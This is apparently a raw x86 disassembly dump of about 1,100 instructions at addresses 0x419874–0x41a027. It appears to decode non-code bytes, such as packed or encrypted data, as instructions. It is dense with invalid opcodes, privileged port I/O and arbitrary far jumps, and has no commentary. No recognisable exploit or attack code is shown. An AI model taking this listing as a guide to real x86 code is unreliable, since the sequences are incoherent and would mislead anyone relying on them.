  419874:	adc    edi,DWORD PTR [ecx-0x2e]
  419877:	ds out 0x6,eax
  41987a:	sbb    ebx,0xcd71d79b
  419880:	inc    esi
  419881:	and    cl,BYTE PTR [ebp+ebx*2-0x39053da]
  419888:	out    dx,eax
  419889:	pop    edi
  41988a:	imul   ebx,DWORD PTR [ebx],0x486232c6
  419890:	dec    ecx
  419891:	sub    eax,0xcaa50822
  419896:	push   cs
  419897:	daa    
  419898:	fild   DWORD PTR [eax+esi*2+0x28]
  41989c:	pop    esp
  41989d:	sub    eax,0x9599f4a0
  4198a2:	and    eax,0x18410391
  4198a7:	cmp    DWORD PTR [eax-0x8],ecx
  4198aa:	pop    ebx
  4198ab:	jmp    0xea597180
  4198b0:	cs sub bl,dh
  4198b3:	xchg   edi,eax
  4198b4:	fild   QWORD PTR [ebx]
  4198b6:	cmp    BYTE PTR [ecx],al
  4198b8:	jae    0x41992a
  4198ba:	mov    esp,0x9ae77493
  4198bf:	or     eax,DWORD PTR [edx+0x1fd430ad]
  4198c5:	arpl   WORD PTR [ecx+edi*1-0x36],sp
  4198c9:	cmp    BYTE PTR [ecx+0x7bed9c7e],0x5a
  4198d0:	xor    DWORD PTR [ebx],ecx
  4198d2:	fadd   st(4),st
  4198d4:	mov    cl,0x9f
  4198d6:	pop    bx
  4198d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198d9:	out    0xe5,eax
  4198db:	(bad)  
  4198dc:	and    DWORD PTR [edx+0x2d],esi
  4198df:	fidiv  DWORD PTR cs:[esi-0x6de365cb]
  4198e6:	fwait
  4198e7:	out    0x78,eax
  4198e9:	cmp    ecx,ebx
  4198eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ec:	sbb    ecx,DWORD PTR [edi+0x324a2b27]
  4198f2:	ss mov ebx,0xc33fac9f
  4198f8:	lock inc ebp
  4198fa:	lods   eax,DWORD PTR ds:[esi]
  4198fb:	add    esi,ebx
  4198fd:	mov    WORD PTR [ebx+0x21],?
  419900:	std    
  419901:	inc    ebx
  419902:	scas   al,BYTE PTR es:[edi]
  419903:	cmp    al,0x25
  419905:	push   cs
  419906:	pop    ebp
  419907:	adc    eax,0x4b9b0a8
  41990c:	adc    DWORD PTR [esi+0x5874e1c2],esi
  419912:	icebp  
  419913:	mov    eax,0x88be3a04
  419918:	jb     0x4198b3
  41991a:	pop    ss
  41991b:	lds    eax,FWORD PTR [esi-0x55875642]
  419921:	pop    ss
  419922:	and    eax,0x4d0dd3fa
  419927:	mov    ah,0x8b
  419929:	aaa    
  41992a:	out    0x52,al
  41992c:	jb     0x419911
  41992e:	(bad)  
  41992f:	test   BYTE PTR [ebx],0xea
  419932:	fidiv  WORD PTR [esp+ecx*1]
  419935:	mov    WORD PTR [esi],ss
  419937:	stos   BYTE PTR es:[edi],al
  419938:	mov    bl,0xed
  41993a:	in     al,0xde
  41993c:	inc    edx
  41993d:	(bad)  
  41993e:	outs   dx,DWORD PTR ds:[esi]
  41993f:	clc    
  419940:	xchg   ebx,eax
  419941:	pusha  
  419942:	rcl    BYTE PTR [esi-0x7aa10391],cl
  419948:	test   BYTE PTR [edi+0x62769127],cl
  41994e:	hlt    
  41994f:	or     ch,BYTE PTR [eax-0x5bc94640]
  419955:	and    BYTE PTR [eax],ch
  419957:	cmp    dl,BYTE PTR [edi-0x4a]
  41995a:	(bad)  [ebp+0x76f47fbb]
  419960:	xor    ch,BYTE PTR [eax+0x46]
  419963:	jbe    0x4199d1
  419965:	clc    
  419966:	sbb    eax,0x1c805119
  41996b:	mov    bl,cl
  41996d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41996f:	lds    ebx,FWORD PTR [ecx-0x75]
  419972:	scas   al,BYTE PTR es:[edi]
  419973:	pop    ebp
  419974:	aad    0x34
  419976:	push   edi
  419977:	(bad)  
  419978:	jb     0x41990f
  41997a:	push   ebx
  41997b:	or     DWORD PTR [ecx],edx
  41997d:	push   ebp
  41997e:	push   edi
  41997f:	inc    esp
  419980:	repz inc esi
  419982:	jnp    0x419978
  419984:	adc    BYTE PTR [ecx],bh
  419986:	adc    eax,0xb637b7ff
  41998b:	outs   dx,DWORD PTR ds:[esi]
  41998c:	mov    ecx,0xe7377847
  419991:	xor    al,0x61
  419993:	cmp    ch,ch
  419995:	jge    0x41995e
  419997:	popa   
  419998:	sbb    ch,BYTE PTR [ebx+0x75]
  41999b:	nop
  41999c:	jae    0x419990
  41999e:	add    bl,0x39
  4199a1:	aas    
  4199a2:	mov    ds:0x9dfb835a,al
  4199a7:	loope  0x4199bc
  4199a9:	test   dh,dh
  4199ab:	imul   ebx,esp,0xa2960adb
  4199b1:	pop    ebx
  4199b2:	mov    ds:0x9e96510c,al
  4199b7:	and    ch,dl
  4199b9:	adc    eax,0x542b52a5
  4199be:	or     al,0x7e
  4199c0:	xchg   ecx,eax
  4199c1:	xchg   esi,eax
  4199c2:	xchg   edi,eax
  4199c3:	xor    bl,BYTE PTR [ecx+0x4]
  4199c6:	mov    ah,BYTE PTR [ebp+0x33]
  4199c9:	cmp    BYTE PTR [ebx],bl
  4199cb:	push   esp
  4199cc:	mov    ecx,0x8563fa1e
  4199d1:	(bad)  
  4199d2:	and    al,0x18
  4199d4:	js     0x419999
  4199d6:	js     0x419a3c
  4199d8:	mov    eax,ds:0xf97b7c2d
  4199dd:	popa   
  4199de:	loopne 0x4199ec
  4199e0:	xchg   esi,eax
  4199e1:	std    
  4199e2:	adc    DWORD PTR [ebp-0x32],edx
  4199e5:	xchg   edi,eax
  4199e6:	cmp    DWORD PTR [edx+0x24],ebx
  4199e9:	jno    0x419a12
  4199eb:	cmp    eax,0xc7a2e423
  4199f0:	adc    eax,0x1c8d1b3b
  4199f5:	sub    al,0xce
  4199f7:	hlt    
  4199f8:	inc    edx
  4199f9:	shr    BYTE PTR [esi+0x3e],0x90
  4199fd:	sbb    BYTE PTR [edi-0x7d3f9c5e],bl
  419a03:	add    al,0x4d
  419a05:	sar    dh,1
  419a07:	dec    edx
  419a08:	pop    esi
  419a09:	and    BYTE PTR [ebp-0x113f3da0],dl
  419a0f:	inc    esi
  419a10:	mov    bh,0xbc
  419a12:	push   esi
  419a13:	(bad)  
  419a14:	into   
  419a15:	fldenv gs:[edx-0x4f]
  419a19:	xchg   ecx,eax
  419a1a:	inc    DWORD PTR [ebp-0x46983dc2]
  419a20:	jp     0x419a47
  419a22:	pop    edi
  419a23:	inc    edi
  419a24:	js     0x419a94
  419a26:	int3   
  419a27:	xchg   esp,eax
  419a28:	mov    al,0x25
  419a2a:	mov    bh,0x45
  419a2c:	in     eax,0xf5
  419a2e:	ss and al,dh
  419a31:	scas   eax,DWORD PTR es:[edi]
  419a32:	repnz xchg ebp,eax
  419a34:	cmp    DWORD PTR [eax+0x7ff655f1],esp
  419a3a:	js     0x419a70
  419a3c:	dec    esi
  419a3d:	xor    DWORD PTR [esi+esi*8+0x63],0xffffff83
  419a42:	aas    
  419a43:	push   cs
  419a44:	pop    ecx
  419a45:	daa    
  419a46:	pop    ecx
  419a47:	or     ebp,ebp
  419a49:	out    0xe9,eax
  419a4b:	stos   DWORD PTR es:[edi],eax
  419a4c:	jno    0x419a13
  419a4e:	jg     0x4199d9
  419a50:	dec    edx
  419a51:	adc    DWORD PTR [eax-0x2235340],edx
  419a57:	ds fnsetpm(287 only) 
  419a5a:	mov    eax,0x85dba9fb
  419a5f:	fwait
  419a60:	mov    BYTE PTR [esi-0x36],ch
  419a63:	dec    ebp
  419a64:	xchg   esi,edx
  419a66:	xor    edi,0xc
  419a69:	clc    
  419a6a:	scas   al,BYTE PTR es:[edi]
  419a6b:	iret   
  419a6c:	xchg   edi,eax
  419a6d:	call   0xcb1ba004
  419a72:	and    eax,0x2211f0e
  419a77:	stos   DWORD PTR es:[edi],eax
  419a78:	pop    ss
  419a79:	pop    edx
  419a7a:	dec    esp
  419a7b:	jb     0x419a20
  419a7d:	sbb    DWORD PTR [edx+0x3e03873a],esp
  419a83:	mov    BYTE PTR [ebp+0x271e0bd3],bh
  419a89:	or     cl,BYTE PTR [edx]
  419a8b:	lock test al,0xa4
  419a8e:	mov    edi,0x170d5c1f
  419a93:	out    dx,eax
  419a94:	sbb    eax,edi
  419a96:	cmp    ch,BYTE PTR [ecx-0x353e39b6]
  419a9c:	test   al,0x17
  419a9e:	loope  0x419a72
  419aa0:	pushf  
  419aa1:	pop    eax
  419aa2:	bound  ecx,QWORD PTR [ecx]
  419aa4:	call   0xbede:0x72376732
  419aab:	out    0x85,eax
  419aad:	or     al,cl
  419aaf:	inc    ecx
  419ab0:	xchg   dl,dh
  419ab2:	sbb    edx,DWORD PTR [ebx]
  419ab4:	retf   0xbdc7
  419ab7:	in     al,dx
  419ab8:	scas   al,BYTE PTR es:[edi]
  419ab9:	scas   eax,DWORD PTR es:[edi]
  419aba:	and    DWORD PTR [eax+ecx*8],ecx
  419abd:	and    BYTE PTR [ecx+0x660ece73],ch
  419ac3:	jbe    0x419b43
  419ac5:	(bad)  [ebx+0x692dcfa]
  419acb:	shl    BYTE PTR [ebp+0x6d92e394],0x8b
  419ad2:	mov    bh,0xf7
  419ad4:	lods   eax,DWORD PTR ds:[esi]
  419ad5:	xchg   ecx,eax
  419ad6:	sub    dl,ah
  419ad8:	hlt    
  419ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ada:	push   ebp
  419adb:	popa   
  419adc:	mov    ds:0xb7f4ebed,eax
  419ae1:	or     dl,BYTE PTR [ecx-0x20e68374]
  419ae7:	mov    es,WORD PTR [ecx-0x514285d3]
  419aed:	xchg   ecx,eax
  419aee:	jmp    0x419b18
  419af0:	adc    dh,ch
  419af2:	pushf  
  419af3:	test   BYTE PTR [eax],cl
  419af5:	in     eax,0xb1
  419af7:	push   edi
  419af8:	mov    esp,0x3fa7d8f0
  419afd:	mov    esi,0x20856bde
  419b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b03:	(bad)  
  419b05:	(bad)  
  419b06:	pop    ss
  419b07:	jl     0x419b58
  419b09:	adc    esp,DWORD PTR ds:0xc175245
  419b0f:	sbb    esi,esi
  419b11:	jge    0x419b5c
  419b13:	add    al,0xfe
  419b15:	mov    ds:0x3db9c83d,al
  419b1a:	sub    eax,0x4e7062cd
  419b1f:	clc    
  419b20:	fsub   DWORD PTR [eax]
  419b22:	pop    ebx
  419b23:	test   cl,cl
  419b25:	dec    edi
  419b26:	cmp    al,al
  419b28:	dec    esp
  419b29:	stos   DWORD PTR es:[edi],eax
  419b2a:	mov    edi,0x72564fa7
  419b2f:	aas    
  419b30:	stos   BYTE PTR es:[edi],al
  419b31:	xlat   BYTE PTR ds:[ebx]
  419b32:	aaa    
  419b33:	(bad)  
  419b35:	jbe    0x419b52
  419b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b38:	xchg   esi,eax
  419b39:	jae    0x419b2c
  419b3b:	(bad)  
  419b3c:	xor    eax,0x97f3d9d6
  419b41:	or     dl,0xe4
  419b44:	xor    DWORD PTR [ecx],0xbb89ef65
  419b4a:	outs   dx,BYTE PTR ds:[esi]
  419b4b:	push   ds
  419b4c:	ss cli 
  419b4e:	add    BYTE PTR [esi-0x756c9a21],bh
  419b54:	xchg   ebx,eax
  419b55:	and    ecx,DWORD PTR [esi+0x60]
  419b58:	mov    ds,WORD PTR [ecx+0x1164e37b]
  419b5e:	sbb    DWORD PTR [esi+0x68cf628d],eax
  419b64:	inc    ecx
  419b65:	xor    ch,0x33
  419b68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b69:	test   eax,0x5cabada4
  419b6e:	ret    
  419b6f:	ss mov al,0xcf
  419b72:	sti    
  419b73:	ret    
  419b74:	call   0xa3fa8005
  419b79:	push   0x60
  419b7b:	gs push ebp
  419b7d:	cmc    
  419b7e:	mov    dl,0xe1
  419b80:	jo     0x419b31
  419b82:	add    eax,0x1ea7836b
  419b87:	test   eax,0x1a79a6c7
  419b8c:	dec    edi
  419b8d:	pop    esi
  419b8e:	out    0x2a,al
  419b90:	inc    eax
  419b91:	dec    esp
  419b92:	dec    ecx
  419b93:	push   ebp
  419b94:	or     eax,0xca65d0fa
  419b99:	xchg   edx,eax
  419b9a:	out    0xc9,eax
  419b9c:	test   al,0xfb
  419b9e:	popa   
  419b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ba0:	jo     0x419b76
  419ba2:	ror    BYTE PTR [esi],cl
  419ba4:	and    al,ah
  419ba6:	mov    ah,0xb2
  419ba8:	lea    edx,[ebx]
  419baa:	int    0x45
  419bac:	dec    ecx
  419bad:	xor    BYTE PTR [eax],cl
  419baf:	std    
  419bb0:	or     al,0x48
  419bb2:	es or  eax,0x24d24a23
  419bb8:	loopne 0x419b3f
  419bba:	fnstenv [edi+0x45]
  419bbd:	push   cs
  419bbe:	xor    al,0x4f
  419bc0:	call   0x2c23:0xb6166351
  419bc7:	sub    eax,DWORD PTR [eax]
  419bc9:	xor    DWORD PTR [esi],0x2b
  419bcc:	not    BYTE PTR [edx+0x81bb826]
  419bd2:	sbb    edi,DWORD PTR [ecx-0x19]
  419bd5:	push   ds
  419bd6:	or     bh,BYTE PTR [ebx-0x4796e45b]
  419bdc:	jmp    0x42a8dd7a
  419be1:	sbb    BYTE PTR [edi+0x25],dl
  419be4:	daa    
  419be5:	dec    eax
  419be6:	pop    edx
  419be7:	add    al,0xa3
  419be9:	test   al,0xa6
  419beb:	imul   ebx,DWORD PTR [edx-0x1ce46daa],0xffffffd1
  419bf2:	pop    ecx
  419bf3:	mov    esi,0x15605087
  419bf8:	cs inc ecx
  419bfa:	scas   al,BYTE PTR es:[edi]
  419bfb:	repnz adc edx,DWORD PTR [edx-0x3b75da60]
  419c02:	mov    ah,0x30
  419c04:	lea    ebx,[ecx+0x46]
  419c07:	loope  0x419bf7
  419c09:	cmp    BYTE PTR [ecx-0x1f],ch
  419c0c:	(bad)  
  419c0d:	jmp    0xed6:0x5423e6b6
  419c14:	or     al,BYTE PTR [ebx]
  419c16:	lock mov esp,0xe45d4e90
  419c1c:	jno    0x419bed
  419c1e:	mov    ebx,0x800c61c6
  419c23:	shr    DWORD PTR [esi+0x5f],cl
  419c26:	iret   
  419c27:	fstp   DWORD PTR [ebx+ecx*1]
  419c2a:	and    BYTE PTR ds:0xd689a12e,dl
  419c30:	call   0x5f9d:0xf387998e
  419c37:	xchg   edx,eax
  419c38:	mov    bh,0xb3
  419c3a:	mov    ch,0x76
  419c3c:	cmp    esi,ebp
  419c3e:	cwde   
  419c3f:	out    dx,al
  419c40:	sub    BYTE PTR [edx-0x60],cl
  419c43:	xchg   ecx,eax
  419c44:	jmp    ebp
  419c46:	int    0xfe
  419c48:	and    al,0x9e
  419c4a:	fisub  WORD PTR [eax]
  419c4c:	and    al,0xf9
  419c4e:	cmp    al,bh
  419c50:	mov    WORD PTR [ebx-0x69cb0a5e],gs
  419c56:	mov    cl,0xba
  419c58:	sub    bl,dh
  419c5a:	mov    dh,0x85
  419c5c:	enter  0xc27f,0x2a
  419c60:	std    
  419c61:	add    ebx,esp
  419c63:	inc    ecx
  419c64:	push   esp
  419c65:	pop    ebx
  419c66:	fisub  DWORD PTR [eax-0x36]
  419c69:	pop    edi
  419c6a:	add    eax,0x51da113b
  419c6f:	lods   eax,DWORD PTR ds:[esi]
  419c70:	scas   al,BYTE PTR es:[edi]
  419c71:	mov    esi,0xf42e28c1
  419c76:	scas   al,BYTE PTR es:[edi]
  419c77:	fild   DWORD PTR [ebx-0x3f]
  419c7a:	mov    ds:0xdcde275f,eax
  419c7f:	test   eax,eax
  419c81:	push   es
  419c82:	or     ax,0xf96b
  419c86:	in     al,dx
  419c87:	je     0x419c7b
  419c89:	rol    BYTE PTR [ebp+ebx*1-0x17],0xca
  419c8e:	pop    ebx
  419c8f:	cmp    eax,0x75da07dd
  419c94:	sub    eax,0x6ee4d88d
  419c99:	shr    BYTE PTR [ebx-0x69f88d6e],cl
  419c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca0:	sbb    al,bl
  419ca2:	jbe    0x419d0a
  419ca4:	pop    ds
  419ca5:	rol    DWORD PTR fs:[edi],1
  419ca8:	aas    
  419ca9:	mov    DWORD PTR [edx-0x972bdfa],ebx
  419caf:	sub    edi,DWORD PTR [ebx-0x30d19bff]
  419cb5:	je     0x419ca5
  419cb7:	retf   0xf9e9
  419cba:	or     al,0x21
  419cbc:	jae    0x419c87
  419cbe:	adc    BYTE PTR [edx-0x1c328f59],ch
  419cc4:	sbb    ch,BYTE PTR [ebp-0x6f]
  419cc7:	jmp    0xe62d783e
  419ccc:	cs gs mov ?,esp
  419cd0:	cmp    bh,BYTE PTR [ebp+ecx*8+0x3093e0a]
  419cd7:	scas   al,BYTE PTR es:[edi]
  419cd8:	out    0x33,al
  419cda:	inc    ebx
  419cdb:	dec    ebx
  419cdc:	adc    dh,dl
  419cde:	imul   esp,DWORD PTR [ebp+0x4b],0x68c2900
  419ce5:	jmp    0xf4ebbfb8
  419cea:	and    edi,DWORD PTR [edi-0x2f]
  419ced:	jne    0x419d11
  419cef:	xchg   ebp,eax
  419cf0:	mov    edx,0x50433ef7
  419cf5:	xor    al,BYTE PTR [ebx+0x57]
  419cf8:	cmp    DWORD PTR [edx],0xc2bd5254
  419cfe:	push   esi
  419cff:	fcmovne st,st(5)
  419d01:	dec    edi
  419d02:	(bad)  
  419d03:	stc    
  419d04:	adc    al,0x48
  419d06:	test   eax,0xb1f6b341
  419d0b:	jo     0x419ccb
  419d0d:	fcomp  st(6)
  419d0f:	data16 loopne 0x419ca0
  419d12:	pop    esi
  419d13:	jb     0x419ce1
  419d15:	scas   eax,DWORD PTR es:[edi]
  419d16:	loop   0x419d6f
  419d18:	outs   dx,BYTE PTR ds:[esi]
  419d19:	xor    BYTE PTR [eax-0x58],ch
  419d1c:	into   
  419d1d:	sub    DWORD PTR [ecx-0x75],edx
  419d20:	(bad)  
  419d21:	mov    dl,0xcc
  419d23:	imul   edi,DWORD PTR [ebx+0x7b],0x401889e3
  419d2a:	jmp    0x419cf4
  419d2c:	jmp    0xecf70c68
  419d31:	sbb    esp,DWORD PTR [edi+eiz*2+0x6c]
  419d35:	xor    eax,0x6f5df926
  419d3a:	xchg   edx,eax
  419d3b:	xor    BYTE PTR [eax-0x56],dh
  419d3e:	xor    ah,BYTE PTR [esi+esi*8+0x29]
  419d42:	cmp    edx,eax
  419d44:	pop    edi
  419d45:	loop   0x419d4f
  419d47:	les    ebp,FWORD PTR [ecx]
  419d49:	push   cs
  419d4a:	out    0x51,eax
  419d4c:	sub    al,0xa7
  419d4e:	jle    0x419d4d
  419d50:	(bad)  
  419d51:	jmp    0x419cf1
  419d53:	cmp    eax,0xb71e4457
  419d58:	xchg   edi,eax
  419d59:	sar    ch,1
  419d5b:	enter  0xb908,0xae
  419d5f:	xchg   edi,eax
  419d60:	sbb    dh,BYTE PTR [ebp+edi*2+0x27e95bc1]
  419d67:	popf   
  419d68:	add    eax,0xbfd382f6
  419d6d:	call   FWORD PTR [esi-0x6feefc3]
  419d73:	fsub   DWORD PTR [edx-0x7a]
  419d76:	mov    al,0x47
  419d78:	sub    DWORD PTR [ebp+0x530a700c],ebx
  419d7e:	xor    al,0x24
  419d80:	mov    edi,0x2fd7f9fb
  419d85:	xchg   edi,eax
  419d86:	ja     0x419def
  419d88:	mov    fs,esi
  419d8a:	add    eax,0x8b5e6d37
  419d8f:	mov    cs,WORD PTR [ebp+0x15e9ad33]
  419d95:	adc    al,0x9d
  419d97:	xor    DWORD PTR [ebp-0x2d28a715],0x7cb2c031
  419da1:	cmp    DWORD PTR [ebp-0x30],0xffffffd4
  419da5:	in     eax,dx
  419da6:	jmp    0xc400:0x8163786f
  419dad:	loopne 0x419dd5
  419daf:	mov    cl,0x9a
  419db1:	mov    edx,0x7a967f06
  419db6:	clc    
  419db7:	outs   dx,DWORD PTR ds:[esi]
  419db8:	xchg   edx,eax
  419db9:	imul   esp,DWORD PTR [ebx],0xb4dc79ad
  419dbf:	es cmp eax,0x743fd242
  419dc5:	fwait
  419dc6:	sbb    al,0x75
  419dc8:	inc    ebx
  419dc9:	pop    ss
  419dca:	add    al,0xc
  419dcc:	out    dx,eax
  419dcd:	sbb    DWORD PTR [ebx+0x30],esi
  419dd0:	imul   ebp,DWORD PTR ds:0x7001f5a6,0xb28b2e1b
  419dda:	mov    ds:0x52f5b5e3,al
  419ddf:	jecxz  0x419df4
  419de1:	pop    es
  419de2:	inc    edi
  419de3:	xchg   esi,eax
  419de4:	stc    
  419de5:	push   esp
  419de6:	jae    0x419e18
  419de8:	adc    eax,0x49
  419deb:	push   cs
  419dec:	push   edi
  419ded:	dec    esi
  419dee:	loopne 0x419dc4
  419df0:	out    0x6a,eax
  419df2:	in     eax,0x8e
  419df4:	push   cs
  419df5:	test   DWORD PTR [eax+edx*8-0x8e137af],ebp
  419dfc:	test   DWORD PTR [ebx-0x12],edi
  419dff:	(bad)  
  419e00:	mov    DWORD PTR [ebx+eax*1+0x7bdc9dc7],edi
  419e07:	cmp    ah,bl
  419e09:	mov    ds:0xc05578de,al
  419e0e:	popa   
  419e0f:	out    dx,eax
  419e10:	push   di
  419e12:	iret   
  419e13:	mov    esp,ds
  419e15:	xchg   edi,eax
  419e16:	imul   edx,DWORD PTR ds:0xf4774f37,0x46
  419e1d:	jae    0x419e6c
  419e1f:	mov    edi,DWORD PTR [esi]
  419e21:	push   ss
  419e22:	adc    cl,ch
  419e24:	scas   al,BYTE PTR es:[edi]
  419e25:	leave  
  419e26:	fwait
  419e27:	and    DWORD PTR [ebp+0x17],edx
  419e2a:	lods   eax,DWORD PTR ds:[esi]
  419e2b:	cld    
  419e2c:	es jmp 0x9fc5:0x1ac70f0b
  419e34:	mov    BYTE PTR [ebx],bh
  419e36:	out    dx,eax
  419e37:	xchg   BYTE PTR [ebp-0x58],bl
  419e3a:	(bad)  
  419e3b:	cmp    DWORD PTR ds:0x9125ce99,ebp
  419e41:	jmp    0xeb4a:0xe224bc8
  419e48:	clc    
  419e49:	icebp  
  419e4a:	inc    ebp
  419e4b:	pop    ebp
  419e4c:	mov    esp,esi
  419e4e:	mov    al,0x34
  419e50:	test   DWORD PTR [eax],ebp
  419e52:	mov    eax,0xf122b51f
  419e57:	add    BYTE PTR [esi-0x30],dh
  419e5a:	inc    edx
  419e5b:	push   DWORD PTR [eax+0x74e1fd2b]
  419e61:	push   0x65
  419e63:	mov    ds:0xc225afd,eax
  419e68:	shl    esi,cl
  419e6a:	lods   eax,DWORD PTR ds:[esi]
  419e6b:	and    dh,al
  419e6d:	out    dx,eax
  419e6e:	pop    ecx
  419e6f:	xor    eax,0x7960325a
  419e74:	pop    ss
  419e75:	fsubr  DWORD PTR [ecx+edi*4]
  419e78:	jbe    0x419eec
  419e7a:	inc    edx
  419e7b:	retf   
  419e7c:	push   cs
  419e7d:	out    dx,eax
  419e7e:	rcl    DWORD PTR [esi-0x21e7566c],cl
  419e84:	mov    ch,0x8
  419e86:	push   ds
  419e87:	mov    esp,eax
  419e89:	adc    al,0x94
  419e8b:	in     al,0xca
  419e8d:	and    BYTE PTR ds:0x530f1b45,ah
  419e93:	ja     0x419ef2
  419e95:	ficomp WORD PTR [ecx-0x85c4628]
  419e9b:	iret   
  419e9c:	mov    edx,DWORD PTR [eax]
  419e9e:	pop    esp
  419e9f:	les    esp,FWORD PTR [ebx+ecx*8]
  419ea2:	xor    al,0x3c
  419ea4:	cs push ebx
  419ea6:	adc    eax,0x25388421
  419eab:	xchg   esi,eax
  419eac:	or     WORD PTR [eax+eax*4+0x60a2b00f],cx
  419eb4:	xor    DWORD PTR [ebx-0x44],edx
  419eb7:	(bad)  
  419eb8:	xchg   BYTE PTR [ebx],dh
  419eba:	int    0x38
  419ebc:	fild   WORD PTR [ecx+eax*2+0x32]
  419ec0:	and    DWORD PTR [esp],0x8b0d71be
  419ec7:	dec    ebp
  419ec8:	push   cs
  419ec9:	enter  0xdf1b,0xa5
  419ecd:	add    BYTE PTR [ebx+0x800cc47],dl
  419ed3:	shl    BYTE PTR [eax+edi*4+0x7d311f67],1
  419eda:	loop   0x419e5c
  419edc:	into   
  419edd:	(bad)  
  419ede:	mov    dl,bl
  419ee0:	push   ecx
  419ee1:	pop    esp
  419ee2:	xchg   BYTE PTR [edx+0x3a],dl
  419ee5:	mov    ds:0x5b29f278,eax
  419eea:	ss xchg ecx,eax
  419eec:	lea    esi,[ebx]
  419eee:	jp     0x419f30
  419ef0:	loop   0x419ef0
  419ef2:	cwde   
  419ef3:	jae    0x419f58
  419ef5:	ret    
  419ef6:	xchg   ebp,eax
  419ef7:	repnz outs dx,BYTE PTR ds:[esi]
  419ef9:	cmp    al,0x18
  419efb:	rol    BYTE PTR [edx+0x6e],cl
  419efe:	and    al,0xd
  419f00:	scas   eax,DWORD PTR es:[edi]
  419f01:	mov    dh,0x6a
  419f03:	adc    al,BYTE PTR [edi+0x74]
  419f06:	inc    edi
  419f07:	shl    BYTE PTR [edi+0x58],cl
  419f0a:	js     0xc6fc568e
  419f10:	in     eax,0x85
  419f12:	add    DWORD PTR [ecx],eax
  419f14:	mov    DWORD PTR [esi+0x26],ebx
  419f17:	jb     0x419eb1
  419f19:	loopne 0x419f90
  419f1b:	ror    esi,0xbc
  419f1e:	and    al,0xd2
  419f20:	sahf   
  419f21:	(bad)  [edx+0x35]
  419f24:	sbb    esp,ebp
  419f26:	or     cl,al
  419f28:	cdq    
  419f29:	sub    ebx,DWORD PTR [esi-0x3b]
  419f2c:	sahf   
  419f2d:	mov    esp,0xe4a86970
  419f32:	jmp    0x54b677ff
  419f37:	icebp  
  419f38:	ja     0x419f74
  419f3a:	test   BYTE PTR [ecx+0x5d],ch
  419f3d:	cmp    DWORD PTR [ecx-0x43],0x49
  419f41:	lods   eax,DWORD PTR ds:[esi]
  419f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f43:	xchg   ecx,eax
  419f44:	mov    DWORD PTR [edx+0x7a8ddb4c],esp
  419f4a:	ret    0x85af
  419f4d:	dec    esp
  419f4e:	sub    edx,DWORD PTR [eax+0x71f62761]
  419f54:	xlat   BYTE PTR ds:[ebx]
  419f55:	mov    cl,0xf1
  419f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f58:	bound  ebp,QWORD PTR [eax-0x1cb85648]
  419f5e:	lods   eax,DWORD PTR ds:[esi]
  419f5f:	pop    eax
  419f60:	fcom   DWORD PTR ds:0x42cadf37
  419f66:	cli    
  419f67:	sub    BYTE PTR [ebp-0x7ffc67c6],al
  419f6d:	xchg   esi,eax
  419f6e:	popa   
  419f6f:	(bad)  
  419f71:	xor    al,0xf9
  419f73:	sbb    eax,0x85f1eef
  419f78:	xchg   DWORD PTR [ebx+0x75],ebp
  419f7b:	ds xchg ebx,eax
  419f7d:	xor    eax,0x8ec18c74
  419f82:	xchg   ebp,eax
  419f83:	lahf   
  419f84:	ficomp DWORD PTR [edi-0x68034c0a]
  419f8a:	jae    0x419faa
  419f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f8d:	or     BYTE PTR [esp+ecx*1-0x36],ch
  419f91:	or     edi,DWORD PTR [edx-0x6824d45b]
  419f97:	js     0x419f5c
  419f99:	pusha  
  419f9a:	lods   eax,DWORD PTR ds:[esi]
  419f9b:	ins    BYTE PTR es:[edi],dx
  419f9c:	(bad)  
  419f9d:	icebp  
  419f9e:	ins    BYTE PTR es:[edi],dx
  419f9f:	pushf  
  419fa0:	adc    BYTE PTR [edi-0x5f],ch
  419fa3:	jns    0x419f47
  419fa5:	in     eax,0x89
  419fa7:	and    al,0x99
  419fa9:	mov    edi,esp
  419fab:	les    edx,FWORD PTR [ebp+0x435c1b2f]
  419fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb2:	rol    DWORD PTR [ebp-0x245e82f5],1
  419fb8:	mul    edx
  419fba:	pushf  
  419fbb:	cmp    BYTE PTR [eax-0x42],dh
  419fbe:	rcr    DWORD PTR [ebx-0x50],1
  419fc1:	retf   
  419fc2:	adc    eax,0x440f8756
  419fc7:	inc    esi
  419fc8:	loopne 0x419faf
  419fca:	sbb    ch,al
  419fcc:	push   ebp
  419fcd:	out    0x75,eax
  419fcf:	loope  0x41a01c
  419fd1:	add    BYTE PTR [edx],dl
  419fd3:	or     BYTE PTR ds:0x15a31fd6,ah
  419fd9:	sahf   
  419fda:	out    dx,eax
  419fdb:	das    
  419fdc:	call   0x3122:0x5ece3fc1
  419fe3:	dec    ebp
  419fe4:	xor    eax,esi
  419fe6:	xchg   DWORD PTR fs:[eax-0x2d821bc8],esp
  419fed:	aad    0x30
  419fef:	xchg   BYTE PTR [ecx],dh
  419ff1:	out    0xaf,eax
  419ff3:	mov    fs,WORD PTR [edi-0x8]
  419ff6:	pop    DWORD PTR [ebx]
  419ff8:	jle    0x419fe2
  419ffa:	pop    edi
  419ffb:	or     al,BYTE PTR [ebx+esi*8-0x287b8c09]
  41a002:	std    
  41a003:	scas   eax,DWORD PTR es:[edi]
  41a004:	jecxz  0x41a072
  41a006:	jne    0x41a042
  41a008:	outs   dx,DWORD PTR ds:[esi]
  41a009:	and    bl,bh
  41a00b:	adc    eax,0x5ba39c41
  41a010:	or     esi,ebp
  41a012:	dec    eax
  41a013:	mov    BYTE PTR [edx+edx*8],cl
  41a016:	jp     0x41a031
  41a018:	mov    eax,ds:0x6d206fdc
  41a01d:	clc    
  41a01e:	pop    es
  41a01f:	mov    ch,0xb2
  41a021:	lds    ebp,FWORD PTR [edx+0x6c5961f0]
  41a027:	mov    eax,0x833f6c3b
